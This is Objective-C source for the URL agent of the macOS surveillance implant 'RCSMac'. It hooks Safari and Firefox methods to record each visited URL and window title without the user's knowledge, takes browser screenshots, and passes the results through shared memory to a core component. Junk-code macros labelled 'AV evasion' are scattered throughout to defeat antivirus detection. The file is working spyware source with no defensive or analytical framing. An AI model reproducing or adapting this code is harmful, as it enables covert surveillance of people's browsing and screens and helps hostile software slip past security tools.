/*
 * RCSMac - URL Agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 13/05/2009
 *  Modified by Massimo Chiodini on 05/08/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <objc/objc-class.h>
//#import <dlfcn.h>

#import "RCSMInputManager.h"
#import "RCSMAgentURL.h"
#import "RCSMCommon.h"

#import "RCSMDebug.h"
#import "RCSMLogger.h"

#import "RCSMAVGarbage.h"

#define BROWSER_UNKNOWN      0x00000000
#define BROWSER_SAFARI       0x00000004
#define BROWSER_MOZILLA      0x00000002
#define BROWSER_TYPE_MASK    0x3FFFFFFF

static NSDate   *gURLDate     = nil;
static NSString *gPrevURL     = nil;
static BOOL gIsSnapshotActive = NO;
static u_int gSnapID          = 0;
static uint8_t gStopLog       = 0;

static NSString *gLastURl = nil;

void logSnapshot(NSData *imageData, int browserType)
{
  NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(urlSnapAdditionalStruct)];
  NSString *_windowName;
  NSData *windowName;
  NSDictionary *windowInfo;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  u_int currentSnapID = gSnapID;
  gSnapID++;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      _windowName = @"";
    }
  else
    {
      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
        {
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          _windowName = @"";
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_008
        
          _windowName = [windowInfo objectForKey: @"windowName"];
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  windowName = [[NSMutableData alloc] initWithData:
                    [_windowName dataUsingEncoding:
                    NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  urlSnapAdditionalStruct *urlSnapshotAdditionalHeader = (urlSnapAdditionalStruct *)[entryData bytes];
  urlSnapshotAdditionalHeader->version        = LOG_URLSNAP_VERSION;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  urlSnapshotAdditionalHeader->browserType    = browserType;
  urlSnapshotAdditionalHeader->urlNameLen     = [gPrevURL lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  urlSnapshotAdditionalHeader->windowTitleLen = [_windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  // URL
  [entryData appendData: [gPrevURL dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Window Name
  [entryData appendData: windowName];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Now append the image
  [entryData appendData: imageData];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  int leftBytesLength = 0;
  int byteIndex       = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if ([entryData length] > MAX_COMMAND_DATA_SIZE)
    {      
      // AV evasion: only on release build
      AV_GARBAGE_007

      do
        {
          NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                             ? 0x300
                             : ([entryData length] - byteIndex));

          shMemoryHeader->status          = SHMEM_WRITTEN;
          shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          shMemoryHeader->direction       = D_TO_CORE;
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          //
          // If it's the first log pass create log header
          // if it's the last close log otherwise just data
          //
          if (byteIndex == 0)
            {
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
            }
          else if ((byteIndex + leftBytesLength) == [entryData length])
            {
              // AV evasion: only on release build
              AV_GARBAGE_007
              
              shMemoryHeader->commandType     = CM_CLOSE_LOG;
            }
          else
            {
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              shMemoryHeader->commandType     = CM_LOG_DATA;
            }

          struct timeval tTime;
          gettimeofday(&tTime, NULL);
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          int highSec = (int32_t)tTime.tv_sec << 20;
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          // Snapshot ID in order to log multiple pictures concurrently
          shMemoryHeader->flag            = currentSnapID;
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          shMemoryHeader->commandDataSize = leftBytesLength;
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          memcpy(shMemoryHeader->commandData,
                 [entryData bytes] + byteIndex,
                 leftBytesLength);
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          if ([mSharedMemoryLogging writeMemory: logData
                                         offset: 0
                                  fromComponent: COMP_AGENT] == TRUE)
            {
#ifdef DEBUG_URL
              verboseLog(@"URL snapshot sent through Shared Memory");
#endif
            }
          else
            {
#ifdef DEBUG_URL
              errorLog(@"Error while logging url snapshot to shared memory");
#endif
            }

          byteIndex += leftBytesLength;
          [logData release];

          usleep(60000);
        } while (byteIndex < [entryData length]);
    }
  else
    {
      NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];

      shMemoryHeader->status          = SHMEM_WRITTEN;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      shMemoryHeader->direction       = D_TO_CORE;
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      shMemoryHeader->commandType     = CM_LOG_DATA;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = [entryData length];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      memcpy(shMemoryHeader->commandData,
             [entryData bytes],
             [entryData length]);
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      if ([mSharedMemoryLogging writeMemory: logData
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG_URL
          verboseLog(@"URL snapshot sent through Shared Memory");
#endif
        }
      else
        {
#ifdef DEBUG_URL
          errorLog(@"Error while logging url snapshot to shared memory");
#endif
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [logData release];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002

  [entryData release];
  [windowName release];
  [_windowName release];
}

BOOL grabSnapshot(int browserType)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSDictionary *windowInfo;
  CGImageRef screenShot;
  NSBitmapImageRep *bitmapRep;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  //
  // Looks like it's better to wait at least a second in order to be sure
  // to get the window on the desktop in case of onProcess->Screenshot
  //
  sleep(1);
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [outerPool release];
      return NO;
    }

  if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
    {
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  screenShot = CGWindowListCreateImage(CGRectNull,
                                       kCGWindowListOptionIncludingWindow,
                                       [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                       kCGWindowImageBoundsIgnoreFraming);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (screenShot == NULL)
    {
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      return NO;
    }
  
  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
  NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
                                             properties: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Log Snapshot
  //
  logSnapshot(tempData, browserType);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [bitmapRep release];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  CGImageRelease(screenShot);
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [outerPool release];

  return YES;
}

void URLStartAgent()
{
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                 forAgent: AGENT_URL
                                                          withCommandType: CM_AGENT_CONF];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (readData != nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_007
    
      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
      NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                              length: shMemLog->commandDataSize];
      urlStruct *urlConfiguration = (urlStruct *)[confData bytes];
      gIsSnapshotActive = urlConfiguration->isSnapshotActive;
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      [confData release];
    }
  else
    {
#ifdef DEBUG_URL
      infoLog(@"No configuration found for agent URL");
#endif
    }
}

@interface myLoggingObject : NSObject

- (void)logURL: (NSDictionary *)aDict;

@end

@implementation myLoggingObject

- (void)logURL: (NSDictionary *)aDict
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSTimeInterval interval;
  
  sleep(2);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (aDict == nil)
    return;
    
  NSString *URL = (NSString*)[aDict objectForKey: @"url"];
  
  if (gURLDate == nil)
    {
      gURLDate = [[NSDate date] retain];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
    }
  
  interval = [[NSDate date] timeIntervalSinceDate: gURLDate];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSString *tempUrl1 = [URL stringByReplacingOccurrencesOfString: @"http://"
                                                      withString: @""];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSString *tempUrl2 = [URL stringByReplacingOccurrencesOfString: @"http://www."
                                                      withString: @""];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSString *tempUrl3 = [URL stringByReplacingOccurrencesOfString: @"www."
                                                      withString: @""];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // if
  // - gPrevURL equals current URL
  // - elapsed seconds since last url log >= 5 sec
  // then avoid logging
  //
  if (gPrevURL != nil
      && ([gPrevURL isEqualToString: URL]
          || [gPrevURL isEqualToString: tempUrl1]
          || [gPrevURL isEqualToString: tempUrl2]
          || [gPrevURL isEqualToString: tempUrl3])
      && interval <= (double)5)
    {
      // AV evasion: only on release build
      AV_GARBAGE_008
    
      return;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (gPrevURL != nil)
    [gPrevURL release];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  gPrevURL = [URL copy];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [gURLDate release];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  gURLDate = [[NSDate date] retain];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // In order to avoid grabbing a wrong window title
  // was 80k
  usleep(300000);
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSDictionary  *windowInfo;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSString      *_windowName;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSMutableData *windowName;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSString *_empty            = @"EMPTY";
  //NSURL *_url                 = [[self _locationFieldURL] copy];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSData *url = [URL dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  NSMutableData *entryData  = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  short unicodeNullTerminator = 0x0000;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp             = gmtime(&rawtime);
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  tmTemp->tm_year   += 1900;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  tmTemp->tm_mon    ++;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  // 0x14 bytes for 64bit processes
  //
  if (sizeof(long) == 4) // 32bit
    {
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
    }
  else if (sizeof(long) == 8) // 64bit
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  u_int32_t logVersion = 0x20100713;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // Log Marker/Version (retrocompatibility)
  [entryData appendBytes: &logVersion
                  length: sizeof(logVersion)];
  
  // AV evasion: only on release build
  AV_GARBAGE_000

  // URL Name
  [entryData appendData: url];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //char singleNullTerminator = '\0';
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Browser Type
  int browserType = [[aDict objectForKey: @"agent"] intValue];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [entryData appendBytes: &browserType
                  length: sizeof(browserType)];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  // Window Name
  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
    }
  else
    {
      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
        { 
          // AV evasion: only on release build
          AV_GARBAGE_001
        
          [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
        }
      else
        {
          _windowName = [[windowInfo objectForKey: @"windowName"] copy];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          windowName = [[NSMutableData alloc] initWithData:
                        [_windowName dataUsingEncoding:
                         NSUTF16LittleEndianStringEncoding]];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          [entryData appendData: windowName];
          [windowName release];
          [_windowName release];
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_URL;
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //infoLog(@"logData: %@", logData);
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_URL
      infoLog(@"URL logged correctly");
#endif
    }
  else
    {
#ifdef DEBUG_URL
      infoLog(@"Error while logging url to shared memory");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [logData release];
  [entryData release];
  [outerPool drain];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (gIsSnapshotActive)
    {
      // AV evasion: only on release build
      AV_GARBAGE_007
    
      grabSnapshot(browserType);
      
      // AV evasion: only on release build
      AV_GARBAGE_002      
    }
  
  [aDict release];
}

@end

@implementation myBrowserWindowController

/*
 * Hook for Safari 6.x
 */

- (void)setTitleHook:(NSString *)title
{
  [self setTitleHook: (title)];
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSString *_url = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  @synchronized((id)&gLastURl)
  {
    if (gLastURl != nil)
      _url = [gLastURl copy];
  }
  
  if (_url == nil)
  {
    [pool release];
    return;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  myLoggingObject *logObject = [[myLoggingObject alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys:_url, @"url",
                                                                       _agent, @"agent", nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: urlDict];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [logObject release];
  [_agent release];
  [_url release];
  
  [pool release];
}

- (void)_drawTopLocationTextFieldHook:(struct CGRect)arg1
{
  [self _drawTopLocationTextFieldHook:arg1];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if ([self respondsToSelector:@selector(attributedStringValue)])
  {
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    id tmp = (id) [self attributedStringValue];
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    if (tmp != nil && [tmp length])
    {
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      @synchronized((id)&gLastURl)
      {
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        if (gLastURl != nil)
          [gLastURl release];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        gLastURl = [[NSString alloc] initWithString:[tmp string]];
      }
    }
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [pool release];
}


/*
 * Hook for Safari 7.x
 */

- (id)expectedOrCurrentURLHook
{
  id __url = nil;
  
  if ([self respondsToSelector:@selector(expectedOrCurrentURLHook)])
  {
    __url = [self expectedOrCurrentURLHook];
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (__url != nil)
  {
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    @synchronized((id)&gLastURl)
    {
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      if (gLastURl != nil)
        [gLastURl release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      gLastURl = [[NSString alloc] initWithString:[((NSURL*)__url) absoluteString]];
    }
  }

  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [pool release];
  
  return __url;
}

/*
 * Hooks for Safari 5.1 >
 */

- (void)webFrameLoadCommittedHook: (id)arg1
{
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [self webFrameLoadCommittedHook: arg1];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
  NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (_url == nil)
    return;
  
  myLoggingObject *logObject = [[myLoggingObject alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                                                                        _agent, @"agent", nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: urlDict];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [logObject release];
  [_agent release];
  [_url release];
}

- (void)closeCurrentTabHook: (id)arg1
{
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  gStopLog = 1;
  [self closeCurrentTabHook: arg1];
}

- (void)didSelectTabViewItemHook
{ 
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  gStopLog = 1;
  [self didSelectTabViewItemHook];
}

- (BOOL)_setLocationFieldTextHook: (id)arg1
{
  BOOL res = [self _setLocationFieldTextHook: arg1];
  
  if (gStopLog == 1)
    {
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      gStopLog = 0;
      return res;
    }

  if (arg1 == nil || [arg1 length] == 0)
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      return res;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSString *_url   = [arg1 copy];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  myLoggingObject *logObject = [[myLoggingObject alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                           _agent, @"agent", nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: urlDict];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [logObject release];
  [_agent release];
  [_url release];

  return res;
}

@end

extern char *get_url32();
extern char *get_url64();

@implementation NSWindow (firefoxHook)

- (void)setTitleHook:(NSString *)title
{
  [self setTitleHook: (title)];

  // Disable for 32bit browser
#ifdef __x86_64__
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  char *ff_url = get_url32();

  if(ff_url == NULL)
    {
      // Try to get url on 64bit headers
      ff_url = get_url64();

      if (ff_url == NULL) 
        {
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          return;
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_MOZILLA];
  NSString *_url = [[NSString alloc] initWithCString: ff_url encoding: NSUTF8StringEncoding];

  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                           _agent, @"agent", nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  

  myLoggingObject *logObject = [[myLoggingObject alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: urlDict];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [logObject release];
  [_agent release];
  [_url release];

#endif
}

@end
